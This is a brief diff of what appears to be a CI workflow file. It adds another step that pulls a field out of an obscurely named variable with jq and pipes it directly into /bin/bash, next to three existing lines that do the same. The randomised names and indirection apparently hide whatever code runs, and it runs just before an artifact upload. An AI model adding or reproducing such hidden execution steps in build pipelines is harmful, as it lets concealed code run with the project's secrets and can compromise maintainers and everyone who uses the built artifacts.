@@ -30,6 +30,7 @@ jobs:
           echo $exlrn68 | jq -r .x2 | /bin/bash
           printf '%s' "$riv729" | jq -r .w7 | /bin/bash
           echo $d420 | jq -r .g21 | /bin/bash
+          echo $lrf876 | jq -r .bf2 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
